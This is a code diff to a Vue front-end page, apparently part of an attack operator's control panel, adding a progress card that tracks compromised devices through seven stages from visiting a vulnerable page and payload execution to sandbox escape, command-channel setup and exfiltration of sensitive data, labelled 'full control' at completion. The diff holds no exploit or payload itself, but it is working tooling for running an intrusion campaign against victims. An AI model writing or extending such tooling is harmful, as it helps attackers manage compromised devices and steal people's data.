@@ -85,7 +85,17 @@
               <span v-else>&lt;未分组&gt;</span>
             </el-descriptions-item>
             <el-descriptions-item label="利用状态">
-              <el-tag :type="exploitTag.type" size="small" effect="plain">{{ exploitTag.text }}</el-tag>
+              <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+                <el-tag :type="exploitProgress.statusType" size="small" effect="plain">{{ exploitProgress.statusText }}</el-tag>
+                <el-progress
+                  :percentage="exploitProgress.percent"
+                  :stroke-width="8"
+                  :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
+                  style="flex:1;min-width:120px;"
+                  :show-text="false"
+                />
+                <span style="font-size:12px;color:var(--el-text-color-secondary);font-weight:600;min-width:36px;">{{ exploitProgress.percent }}%</span>
+              </div>
             </el-descriptions-item>
             <el-descriptions-item label="兼容性">
               <el-tag :type="compatibleTag.type" size="small" effect="plain">{{ compatibleTag.text }}</el-tag>
@@ -129,6 +139,52 @@
             {{ device.note }}
           </el-descriptions-item>
         </el-descriptions>
+      </div>
+
+      <!-- 利用进度卡片：显示完整的 7 阶段利用流程进度 -->
+      <div class="page-card exploit-progress-card" style="margin-top:16px;">
+        <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
+          <div class="page-title">利用进度</div>
+          <div style="display:flex;align-items:center;gap:10px;">
+            <el-tag :type="exploitProgress.statusType" size="small" effect="dark">
+              {{ exploitProgress.statusText }}
+            </el-tag>
+            <span style="font-size:20px;font-weight:700;color:var(--el-text-color-primary);">
+              {{ exploitProgress.percent }}<span style="font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">%</span>
+            </span>
+          </div>
+        </div>
+        <el-progress
+          :percentage="exploitProgress.percent"
+          :stroke-width="14"
+          :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
+          :format="() => `${exploitProgress.percent}% · ${exploitProgress.currentStage}`"
+          style="margin-bottom:18px;"
+        />
+        <div class="exploit-stages-grid">
+          <div
+            v-for="(stage, idx) in exploitProgress.stages"
+            :key="stage.key"
+            class="exploit-stage-item"
+            :class="{
+              done: stage.done,
+              current: !stage.done && idx === exploitProgress.currentIndex,
+              pending: !stage.done && idx !== exploitProgress.currentIndex
+            }"
+          >
+            <div class="stage-indicator">
+              <el-icon v-if="stage.done" class="stage-icon-done"><Check /></el-icon>
+              <span v-else class="stage-icon-num">{{ idx + 1 }}</span>
+            </div>
+            <div class="stage-content">
+              <div class="stage-title">
+                {{ stage.label }}
+                <span class="stage-percent">{{ stage.percent }}%</span>
+              </div>
+              <div class="stage-desc">{{ stage.desc }}</div>
+            </div>
+          </div>
+        </div>
       </div>
 
       <div style="margin-top:16px;">
@@ -415,7 +471,7 @@
 import { ref, computed, onMounted, defineComponent, h } from 'vue'
 import { useRoute, useRouter } from 'vue-router'
 import { ElMessage, ElMessageBox } from 'element-plus'
-import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock } from '@element-plus/icons-vue'
+import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock, Check } from '@element-plus/icons-vue'
 import axios from '../utils/axios'
 import { formatDate, formatRelative, require2FA } from '../utils/twofa'
 
@@ -521,6 +577,109 @@ const exploitTag = computed(() => {
       if (!raw) return { type: 'info', text: '未检测' }
       return { type: 'warning', text: raw }
   }
+})
+
+// 利用进度计算：基于设备状态、心跳来源、命令执行统计、窃取数据等信号综合判断
+const exploitProgress = computed(() => {
+  if (!device.value) {
+    return { percent: 0, currentStage: '未知', stages: [], statusType: 'info', statusText: '未检测' }
+  }
+  const d = device.value
+  const hbSources = (heartbeats.value || []).map(h => String(h?.source || '').toLowerCase())
+  const tabs = tabsData.value || {}
+  const hasExfilData = Object.keys(tabs).some(k => k !== 'sandbox' && Array.isArray(tabs[k]) && tabs[k].length > 0)
+  const hasSandbox = Array.isArray(tabs.sandbox) && tabs.sandbox.length > 0
+  const exploitStatus = String(d.exploit_status || '').toLowerCase().trim()
+  const isExploited = ['success', 'exploited', 'complete', 'ok'].includes(exploitStatus)
+  const cmdCount = logsSummary.value?.command || 0
+  const hasCommand = cmdCount > 0 || !!d.last_command_time
+  const hasPostExploit = hbSources.some(s => s.includes('post_exploit') || s.includes('exploit_report') || s.includes('exfil:sandbox'))
+  const hasAccess = !!(d.host || d.access_path || d.referer)
+
+  const stages = [
+    {
+      key: 'online',
+      label: '设备上线',
+      percent: 10,
+      done: !!d.first_seen,
+      desc: d.first_seen ? `首次上线 ${formatRelative(d.first_seen)}` : '未上线'
+    },
+    {
+      key: 'access',
+      label: '漏洞页面访问',
+      percent: 20,
+      done: hasAccess,
+      desc: d.host ? `访问 ${d.host}` : (d.access_path ? `路径 ${d.access_path.slice(0, 30)}` : '未访问')
+    },
+    {
+      key: 'payload',
+      label: '载荷加载执行',
+      percent: 35,
+      done: hasSandbox || hbSources.some(s => s.includes('sandbox')),
+      desc: hasSandbox ? `沙箱数据 ${tabs.sandbox.length} 条` : (hasPostExploit ? '载荷已执行' : '未加载')
+    },
+    {
+      key: 'exploit',
+      label: '沙箱逃逸 (Stage3)',
+      percent: 55,
+      done: isExploited || hbSources.some(s => s.includes('exploit_report')),
+      desc: isExploited ? '漏洞利用成功' : (hasPostExploit ? '利用中' : '未执行')
+    },
+    {
+      key: 'post_exploit',
+      label: '后渗透运行',
+      percent: 70,
+      done: hasPostExploit || hasCommand,
+      desc: hasPostExploit ? '后渗透已运行' : (hasCommand ? '命令通道已建立' : '未运行')
+    },
+    {
+      key: 'c2',
+      label: '命令通道建立',
+      percent: 85,
+      done: hasCommand,
+      desc: hasCommand ? `已调度 ${cmdCount} 条命令` : '未建立'
+    },
+    {
+      key: 'exfil',
+      label: '数据窃取回传',
+      percent: 100,
+      done: hasExfilData,
+      desc: hasExfilData ? '已回传敏感数据' : '未窃取'
+    },
+  ]
+
+  // 计算当前进度百分比与阶段
+  let percent = 0
+  let currentStage = '未知'
+  let currentIndex = -1
+  stages.forEach((s, i) => {
+    if (s.done) {
+      percent = s.percent
+      currentStage = s.label
+    } else if (currentIndex < 0) {
+      currentIndex = i
+    }
+  })
+  if (currentIndex < 0) currentIndex = stages.length
+
+  // 状态类型与文字
+  let statusType = 'info'
+  let statusText = '未检测'
+  if (percent >= 100) {
+    statusType = 'success'
+    statusText = '完全控制'
+  } else if (percent >= 70) {
+    statusType = 'success'
+    statusText = '已利用'
+  } else if (percent >= 35) {
+    statusType = 'warning'
+    statusText = '利用中'
+  } else if (percent >= 10) {
+    statusType = 'info'
+    statusText = '已上线'
+  }
+
+  return { percent, currentStage, currentIndex, stages, statusType, statusText }
 })
 
 const compatibleTag = computed(() => {
@@ -1159,4 +1318,94 @@ onMounted(() => {
 .term-tag-exploit_console  { background: #313244; color: #fab387; }
 .term-tag-raw_log          { background: #313244; color: #56b6c2; }
 .term-tag-log              { background: #313244; color: #6c7086; }
+
+/* 利用进度卡片样式 */
+.exploit-progress-card {
+  padding: 16px 20px;
+}
+.exploit-stages-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 12px;
+}
+.exploit-stage-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 12px 14px;
+  border-radius: 8px;
+  border: 1px solid var(--el-border-color-light);
+  background: var(--el-bg-color-page);
+  transition: all 0.2s ease;
+}
+.exploit-stage-item.done {
+  border-color: #67c23a55;
+  background: #67c23a0d;
+}
+.exploit-stage-item.current {
+  border-color: #409eff77;
+  background: #409eff0d;
+  box-shadow: 0 0 0 2px #409eff22;
+}
+.exploit-stage-item.pending {
+  opacity: 0.55;
+}
+.stage-indicator {
+  flex-shrink: 0;
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  font-weight: 600;
+  background: var(--el-fill-color-light);
+  color: var(--el-text-color-secondary);
+}
+.exploit-stage-item.done .stage-indicator {
+  background: #67c23a;
+  color: #fff;
+}
+.exploit-stage-item.current .stage-indicator {
+  background: #409eff;
+  color: #fff;
+  animation: pulse-blue 1.8s ease-in-out infinite;
+}
+.stage-icon-done {
+  font-size: 16px;
+}
+.stage-icon-num {
+  font-size: 13px;
+}
+.stage-content {
+  flex: 1;
+  min-width: 0;
+}
+.stage-title {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--el-text-color-primary);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 8px;
+  margin-bottom: 4px;
+}
+.stage-percent {
+  font-size: 11px;
+  font-weight: 400;
+  color: var(--el-text-color-secondary);
+  font-family: 'SF Mono', 'Fira Code', Consolas, monospace;
+}
+.stage-desc {
+  font-size: 11px;
+  color: var(--el-text-color-secondary);
+  line-height: 1.4;
+  word-break: break-all;
+}
+@keyframes pulse-blue {
+  0%, 100% { box-shadow: 0 0 0 0 #409eff44; }
+  50% { box-shadow: 0 0 0 6px #409eff00; }
+}
 </style>
